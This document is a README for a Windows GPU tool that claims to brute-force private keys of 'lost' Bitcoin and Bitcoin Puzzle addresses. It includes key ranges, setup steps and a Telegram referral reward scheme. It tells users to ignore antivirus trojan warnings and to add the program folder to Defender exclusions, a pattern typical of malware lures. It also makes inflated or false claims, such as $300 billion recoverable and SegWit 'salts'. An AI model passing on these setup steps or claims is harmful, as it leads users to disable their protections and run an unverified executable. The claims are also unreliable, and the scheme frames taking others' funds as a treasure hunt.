# OCL_LBU-v.2.0
Open CL Lost BTC Ublocker tool for Stalkers community and Open CL 1.2 devices (CPUs, AMD, Intel GPUs)

Welcome, Stalker!

There are about 42,000 Bitcoin addresses in the network with abandoned, forgotten, or lost passwords and keys—addresses that have had no outgoing transactions for 
over 10 years. Additionally, there are challenge addresses set up by billionaire whales, such as the 1000 BTC Bitcoin Puzzle. 
All these addresses are baked into the OCL_LBU_v2.exe tool and collectively hold around $300 billion.

If you want to join the hunt and recover these treasures, unzip the archive into your Windows user folder (typically `C:\Users\YourName\`).

1. Open the `OCL_LBU_v2` folder and locate `OCL_LBU_v2.0.exe` inside.
2. Ignore any antivirus or Windows Defender warnings about suspicious files or trojans—these arise because the program deals with crypto-functions and key generation.
3. Add the `OCL_LBU_v2` folder to your antivirus whitelist and to Windows Defender exclusions 
(`Settings → Update & Security → Windows Security → Virus & Threat Protection → Manage Settings → Add or Remove Exclusions → Add an Exclusion → Folder → 
Choose OCL_LBU_v2 folder`).

`OCL_LBU_v2` works with GPUs and CPUs supporting OpenCL 1.2 and above.

---

## Supported Bitcoin Address Types

Today there are five address types derived from a single private key:

1. **Legacy (uncompressed)** (pre-2013, e.g., `1EHNa6Q4Jz2uvNExL497mE43ikXhwF6kZm`)
2. **Legacy (compressed)** (post-2013, e.g., `1BgGZ9tcN4rm9KBzDn7KprQz87SZ26SAMH`)
3. **SegWit P2SH** (post-2017, e.g., `3JvL6Ymt8MVWiCNHC7oWU6nLeHNJKLZGLN`)
4. **Bech32 SegWit** (`p2wpkh` and `p2wsh`, e.g., `bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4`)
5. **Taproot Schnorr** (e.g., `bc1pmfr3p9j00pfxjh0zmgp99y8zftmd3s5pmedqhyptwy6lm87hf5sspknck9`)

We focus on compressed and uncompressed legacy addresses, since they are vulnerable to brute-force and contain the majority of lost funds. 
Recovering keys for SegWit and Taproot addresses is nearly impossible due to additional scripts and salts used.

---

## Setting the Key Range

The program lets you specify a hex range from **START** to **END** for your search to improve your chances:

* Addresses created before 2013 are typically uncompressed; post-2013 are usually compressed (not guaranteed).
* Some challenge ranges (e.g., from the 1000 BTC Bitcoin Puzzle) are known—all compressed:

START:	400001e410b4514000 END: 7fffffffffffffffff  					include 1PWo3JeB9jrGwfHDNpdGK54CRas7fsVzXU		
START:	800000000000000000 END: ffffffffffffffffff  					include 1JTK7s9YVYywfm5XUH7RNhHJH1LshCaRFR		
START:	1000000000000000000 END: 1ffffffffffffffffff  				include 12VVRNPi4SJqUTsp6FmqDqY5sGosDtysn4		
START:	2000000000000000000 END: 3ffffffffffffffffff  				include 1FWGcVDK3JGzCC3WtkYetULPszMaK2Jksv			
START:	8000000000000000000 END: fffffffffffffffffff  				include 1DJh2eHFYQfACPmrvpyWc8MSTYKh7w9eRF		
START:	10000000000000000000 END: 1fffffffffffffffffff  				include 1Bxk4CQdqL9p22JEtDfdXMsng1XacifUtE		
START:	20000000000000000000 END: 3fffffffffffffffffff  				include 15qF6X51huDjqTmF9BJgxXdt1xcj46Jmhb		
START:	40000000000000000000 END: 7fffffffffffffffffff  				include 1ARk8HWJMn8js8tQmGUJeQHjSE7KRkn2t8		
START:	100000000000000000000 END: 1ffffffffffffffffffff  				include 15qsCm78whspNQFydGJQk5rexzxTQopnHZ		
START:	200000000000000000000 END: 3ffffffffffffffffffff  				include 13zYrYhhJxp6Ui1VV7pqa5WDhNWM45ARAC		
START:	400000000000000000000 END: 7ffffffffffffffffffff  				include 14MdEb4eFcT3MVG5sPFG4jGLuHJSnt1Dk2		
START:	800000000000000000000 END: fffffffffffffffffffff  				include 1CMq3SvFcVEcpLMuuH8PUcNiqsK1oicG2D 
START:	2000000000000000000000 END: 3fffffffffffffffffffff  				include 1K3x5L6G57Y494fDqBfrojD28UJv4s5JcK		
START:	4000000000000000000000 END: 7fffffffffffffffffffff  				include 1PxH3K1Shdjb7gSEoTX7UPDZ6SH4qGPrvq	
START:	8000000000000000000000 END: ffffffffffffffffffffff  				include 16AbnZjZZipwHMkYKBSfswGWKDmXHjEpSf		
START:	10000000000000000000000 END: 1ffffffffffffffffffffff  				include 19QciEHbGVNY4hrhfKXmcBBCrJSBZ6TaVt
START:	40000000000000000000000 END: 7ffffffffffffffffffffff  				include 1EzVHtmbN4fs4MiNk3ppEnKKhsmXYJ4s74		
START:	80000000000000000000000 END: fffffffffffffffffffffff  				include 1AE8NzzgKE7Yhz7BWtAcAAxiFMbPo82NB5		
START:	100000000000000000000000 END: 1fffffffffffffffffffffff  			include 17Q7tuG2JwFFU9rXVj3uZqRtioH3mx2Jad		
START:	200000000000000000000000 END: 3fffffffffffffffffffffff  			include 1K6xGMUbs6ZTXBnhw1pippqwK6wjBWtNpL 	
START:	800000000000000000000000 END: ffffffffffffffffffffffff  			include 15ANYzzCp5BFHcCnVFzXqyibpzgPLWaD8b
START:	1000000000000000000000000 END: 1ffffffffffffffffffffffff  			include 18ywPwj39nGjqBrQJSzZVq2izR12MDpDr8
START:	2000000000000000000000000 END: 3ffffffffffffffffffffffff  			include 1CaBVPrwUxbQYYswu32w7Mj4HR4maNoJSX
START:	4000000000000000000000000 END: 7ffffffffffffffffffffffff  			include 1JWnE6p6UN7ZJBN7TtcbNDoRcjFtuDWoNL
START:	10000000000000000000000000 END: 1fffffffffffffffffffffffff  			include 1CKCVdbDJasYmhswB6HKZHEAnNaDpK7W4n
START:	20000000000000000000000000 END: 3fffffffffffffffffffffffff  			include 1PXv28YxmYMaB8zxrKeZBW8dt2HK7RkRPX
START:	40000000000000000000000000 END: 7fffffffffffffffffffffffff  			include 1AcAmB6jmtU6AiEcXkmiNE9TNVPsj9DULf
START:	80000000000000000000000000 END: ffffffffffffffffffffffffff  			include 1EQJvpsmhazYCcKX5Au6AZmZKRnzarMVZu
START:	200000000000000000000000000 END: 3ffffffffffffffffffffffffff  			include 18KsfuHuzQaBTNLASyj15hy4LuqPUo1FNB
START:	400000000000000000000000000 END: 7ffffffffffffffffffffffffff  			include 15EJFC5ZTs9nhsdvSUeBXjLAuYq3SWaxTc
START:	800000000000000000000000000 END: fffffffffffffffffffffffffff  			include 1HB1iKUqeffnVsvQsbpC6dNi1XKbyNuqao
START:	1000000000000000000000000000 END: 1fffffffffffffffffffffffffff  			include 1GvgAXVCbA8FBjXfWiAms4ytFeJcKsoyhL
START:	4000000000000000000000000000 END: 7fffffffffffffffffffffffffff  			include 1824ZJQ7nKJ9QFTRBqn7z7dHV5EGpzUpH3
START:	8000000000000000000000000000 END: ffffffffffffffffffffffffffff  			include 18A7NA9FTsnJxWgkoFfPAFbQzuQxpRtCos
START:	10000000000000000000000000000 END: 1ffffffffffffffffffffffffffff  			include 1NeGn21dUDDeqFQ63xb2SpgUuXuBLA4WT4
START:	20000000000000000000000000000 END: 3ffffffffffffffffffffffffffff  			include 174SNxfqpdMGYy5YQcfLbSTK3MRNZEePoy
START:	80000000000000000000000000000 END: fffffffffffffffffffffffffffff  			include 1MnJ6hdhvK37VLmqcdEwqC3iFxyWH2PHUV
START:	100000000000000000000000000000 END: 1fffffffffffffffffffffffffffff  		include 1KNRfGWw7Q9Rmwsc6NT5zsdvEb9M2Wkj5Z
START:	200000000000000000000000000000 END: 3fffffffffffffffffffffffffffff  		include 1PJZPzvGX19a7twf5HyD2VvNiPdHLzm9F6
START:	400000000000000000000000000000 END: 7fffffffffffffffffffffffffffff  		include 1GuBBhf61rnvRe4K8zu8vdQB3kHzwFqSy7
START:	1000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffff  		include 1GDSuiThEV64c166LUFC9uDcVdGjqkxKyh
START:	2000000000000000000000000000000 END: 3ffffffffffffffffffffffffffffff  		include 1Me3ASYt5JCTAK2XaC32RMeH34PdprrfDx
START:	4000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffff  		include 1CdufMQL892A69KXgv6UNBD17ywWqYpKut
START:	8000000000000000000000000000000 END: fffffffffffffffffffffffffffffff  		include 1BkkGsX9ZM6iwL3zbqs7HWBV7SvosR6m8N 
START:	20000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffff  		include 1AWCLZAjKbV1P7AHvaPNCKiB7ZWVDMxFiz
START:	40000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffff  		include 1G6EFyBRU86sThN3SSt3GrHu1sA7w7nzi4
START:	80000000000000000000000000000000 END: ffffffffffffffffffffffffffffffff  		include 1MZ2L1gFrCtkkn6DnTT2e4PFUTHw9gNwaj
START:	100000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffffff  		1Hz3uv3nNZzBVMXLGadCucgjiCs5W9vaGz 
START:	400000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffffff  		16zRPnT8znwq42q7XeMkZUhb1bKqgRogyy
START:	800000000000000000000000000000000 END: fffffffffffffffffffffffffffffffff  		1KrU4dHE5WrW8rhWDsTRjR21r8t3dsrS3R
START:	1000000000000000000000000000000000 END: 1fffffffffffffffffffffffffffffffff  		17uDfp5r4n441xkgLFmhNoSW1KWp6xVLD
START:	2000000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffffff  		13A3JrvXmvg5w9XGvyyR4JEJqiLz8ZySY3
START:	4000000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffffff  		16RGFo6hjq9ym6Pj7N5H7L1NR1rVPJyw2v 
START:	8000000000000000000000000000000000 END: ffffffffffffffffffffffffffffffffff  		1UDHPdovvR985NrWSkdWQDEQ1xuRiTALq
START:	10000000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffffffff  	15nf31J46iLuK1ZkTnqHo7WgN5cARFK3RA
START: 20000000000000000000000000000000000 END: 3ffffffffffffffffffffffffffffffffff  		1Ab4vzG6wEQBDNQM1B2bvUz4fqXXdFk2WT
START: 40000000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffffffff  		1Fz63c775VV9fNyj25d9Xfw3YHE6sKCxbt
START: 80000000000000000000000000000000000 END: fffffffffffffffffffffffffffffffffff  		1QKBaU6WAeycb3DbKbLBkX7vJiaS8r42Xo
START: 100000000000000000000000000000000000 END: 1fffffffffffffffffffffffffffffffffff  		1CD91Vm97mLQvXhrnoMChhJx4TP9MaQkJo
START: 200000000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffffffff  		15MnK2jXPqTMURX4xC3h4mAZxyCcaWWEDD
START: 400000000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffffffff  		13N66gCzWWHEZBxhVxG18P8wyjEWF9Yoi1
START: 800000000000000000000000000000000000 END: ffffffffffffffffffffffffffffffffffff  		1NevxKDYuDcCh1ZMMi6ftmWwGrZKC6j7Ux
START: 1000000000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffffffffff  	19GpszRNUej5yYqxXoLnbZWKew3KdVLkXg
START: 2000000000000000000000000000000000000 END: 3ffffffffffffffffffffffffffffffffffff  	1M7ipcdYHey2Y5RZM34MBbpugghmjaV89P
START: 4000000000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffffffffff  	18aNhurEAJsw6BAgtANpexk5ob1aGTwSeL
START: 8000000000000000000000000000000000000 END: fffffffffffffffffffffffffffffffffffff  	1FwZXt6EpRT7Fkndzv6K4b4DFoT4trbMrV
START: 10000000000000000000000000000000000000 END: 1fffffffffffffffffffffffffffffffffffff  	1CXvTzR6qv8wJ7eprzUKeWxyGcHwDYP1i2
START: 20000000000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffffffffff  	1MUJSJYtGPVGkBCTqGspnxyHahpt5Te8jy
START: 40000000000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffffffffff  	13Q84TNNvgcL3HJiqQPvyBb9m4hxjS3jkV
START: 80000000000000000000000000000000000000 END: ffffffffffffffffffffffffffffffffffffff  	1LuUHyrQr8PKSvbcY1v1PiuGuqFjWpDumN
START: 100000000000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffffffffffff  	18192XpzzdDi2K11QVHR7td2HcPS6Qs5vg
START: 200000000000000000000000000000000000000 END: 3ffffffffffffffffffffffffffffffffffffff  	1NgVmsCCJaKLzGyKLFJfVequnFW9ZvnMLN
START: 400000000000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffffffffffff  	1AoeP37TmHdFh8uN72fu9AqgtLrUwcv2wJ
START: 800000000000000000000000000000000000000 END: fffffffffffffffffffffffffffffffffffffff  	1FTpAbQa4h8trvhQXjXnmNhqdiGBd1oraE
START: 1000000000000000000000000000000000000000 END: 1fffffffffffffffffffffffffffffffffffffff  	14JHoRAdmJg3XR4RjMDh6Wed6ft6hzbQe9
START: 2000000000000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffffffffffff  	19z6waranEf8CcP8FqNgdwUe1QRxvUNKBG
START: 4000000000000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffffffffffff  	14u4nA5sugaswb6SZgn5av2vuChdMnD9E5
START: 8000000000000000000000000000000000000000 END: ffffffffffffffffffffffffffffffffffffffff  	1NBC8uXJy1GiJ6drkiZa1WuKn51ps7EPTv

You can choose any single range or multiple in sequence (e.g., `400001e410b4514000` to `1fffffffffffffffffff` covers six addresses).

All other addresses lie in the overall range from START: ffffffffffffffffffffffffffffffffffffffff to 
END: fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141 and include both compressed and uncompressed.

---

## How to Run

Double-click `OCL_LBU_v2.0.exe`. In the program window, You will see:
(example)
======= Available OpenCL devices ========
ID:     0
Name:   Ellismere (AMD GPU)
Memory: 8000 MB
Compute units: 32

ID:     1
Name:          Intel(R) Core(TM) i7-3770K CPU @ 3.50GHz
Memory: 32455 MB
Compute units: 8
========= End of devices list ======

It shows the OpenCL devices in your system.

1) [*] Enter global configuration...

=== Enter global parameters ===

**Working mode (Linear, Pendulum, Random) [Linear|Random|Pendulum] (default: Pendulum):
Enter the working mode: Linear (linear searching from start range to end with step 1). Random (Full randomize method in range of choosen random digits length of keys). Pendulum (Deterministic pendulum mode with cycling step inside the choosen range with online GreyZone database using, most effective in real search).

# Pendulum state and direction will be saved in file, checked ranges in online GreyZone Database "Grey.Zone". Also all statistics and referrals (who invited you) will be saved in database.

2)In Pendulum and Linear modes input bounds of range in HEX format:
**START key in hex (hex) (default: 1000000000000000000): (e.g., `400001e410b4514000`).
**END key in hex (hex) (default: 3ffffffffffffffffff): (e.g., `7fffffffffffffffff`).

3) In Pendulum mode enter the cycling step of pendulum:
**Number of cycling subranges [2..128]: (e.g., 64)

4) From the aviable devices list enter the number of OpenCL devices to use(Program will accept quantity counting from top to bottom of list):
**Quantity of CUDA devices: (e.g., 2)

5) **Quantity of GPU blocks [10..512]: (e.g., 191 for GPU, 8 for CPU)

6) **Number of threads per block [32..512], multiple of 32: (e.g., 192 for GPU, 32 for CPU)

7) **Number of points in threads [50..2000]: (e.g., 1000, depends of VRAM)

8) **Your BTC Address for payout: (e.g., 1bcfybub5n5k3455n34j5nnn77d78 - your own address for receive reward)

9) **Your Telegram username (without @): (e.g., JohnTompson - for contact and stalkers group notification in case of finding key)

10) **Your Referrer Telegram username (without @): (e.g., Nick23, it can't be changed)

11) **Enter parameters for every device? [y/N] (e.g., Y - you will able to enter own unique parameters for every device, otherwise global configuration will be used for all devices)
Example:
----------------------------------------------------------------------------------------------------------------------------------
Using devices: 0..1
Enter device id (empty for exit): 0
=== Overrides for DEVICE 0 ===
Working mode (Linear, Pendulum, Random) [Linear|Random|Pendulum] (default: Pendulum): Linear
START key in hex (0-9, A-F) (hex) (default: 1000000000000000000):
END key in hex   (0-9, A-F) (hex) (default: 3FFFFFFFFFFFFFFFFFF):
BLOCKS: 12
THREADS: 32
POINTS: 400
[OK] overrides for DEVICE 0 updated: {'WORK MODE': 'Linear', 'Subranges': 1, 'RANDOM MODE': False}
Enter device id (empty for exit):
----------------------------------------------------------------------------------------------------------------------------------

12) **Save entered parameters to config file? [Y/n] y
[OK] Config saved in: ..\OCL_LBU\config.json (on following program using you will able to use saved config on start)

After launch, you’ll see initialization and live performance stats

#Random mode

**Number of key digits to start \[18-64]**: desired range of digits for Random mode  

## Grey Zone

Its a online 24/7 working database of passed/checked key ranges. Every 5 minutes program make requests of checking/saving chancks.
OCL_LBU first check if selected range in Grey Zone, if not - it try to scan it for a key.

The program uses AI math optimization methods, deterministic pendulum cyclic ranges mode and full-random brute-force. 
The longer it runs, the higher your chance to find a key. When a key is found, it prints the address and stops all processes, saving results to `Found_Keys.txt`.

---

## Referral & Rewards Network

**Referral structure:**

* **Stalker**: anyone in the Telegram group ([https://t.me/LostBTCUnlocker](https://t.me/LostBTCUnlocker)).
* **Bolt**: a Stalker you invited.
* Each found key awards:

  * 50% to the finder
  * 7% to their inviter (Stalker)
  * 13% split depends on Working Time among all active group members 
  who posted a weekly photo/video proof of running the program (Fri–Mon) with Grey.Zone posting
	- > 200 working hours + 1 share of 13% reward
	- > 300 wh + 2 shares
	- > 600 wh + 3 shares
	- > 800 wh + 4 shares
	- > 1000 wh + 5 shares
	- > 1500 wh + 6 shares
	- > 2000 wh + 7 shares
	- > 2500 wh + 8 shares
	- > 3000 wh + 9 shares
	- > 3500 wh + 10 shares
	- > 4000 wh + 11 shares
	- > 4500 wh + 12 shares
	- > 5000 wh + 13 shares

Now you have your own "Labor book" - cryptographic curve saved on your user %APPDATA% folder (e.g. "C:\Users\...\AppData\Roaming\LBU\CUDA_LBU")
It holds your Working Hours safe in curve even when your OCL_LBU is offline.

For example, if 1,000 BTC is found:

* Finder: 500 BTC
* Their Stalker: 70 BTC
* Active group: 1000 Stalkers 
* 500 (200 wh) active members 500 shares: 0.009 BTC each (\~\$1,000)
* 300 (2000 wh) active members 2100 shares: 0.063 BTC each (\~\$7,500)
* 200 (4000 wh) active members 2200 shares: 0.099 BTC each (\~\$11,500)
* 197 (5000 wh) active members 2561 shares: 0.117 BTC each (\~\$14,000)
* Total: 7361 shares of 13% (500 BTC) / 7361 = 0.009 BTC for 1 share

## TESTING Finding Key

To test, use a micro-range for address `13zb1hQbWVsc2S7ZTZnP2G4undNNpdh5so:`
`START: 2832ed73f2b5e25ee END: 2832ed75f3b5e45ee`

Or you can make your own test.
Generate btc legacy compressed address here: https://secretscan.org/PrivateKeyHex
Put it in the end of ..\OCL_LBU\bin\points.dev (open with text editor and save)
Copy and save somewhere the Private key Hex from site page.
Make start range hex - change the 8th digit from end of a key minus 1
And make end hex - change the 8th digit from end of a key plus 1
Run the test OCL_LBU with this ranges in Linear mode.

It must find a code in some minutes and show in the table

## Minimum requirements:

Your GPUs run at full load — provide proper cooling (floor fans, open case), especially in hot weather.

* Windows 10
* Intel Celeron 1 GHz
* 4 GB RAM
* OpenCL >= 1.2 GPU or CPU
* Internet connection
---

Good luck, Stalker. Patience and persistence will pay off!
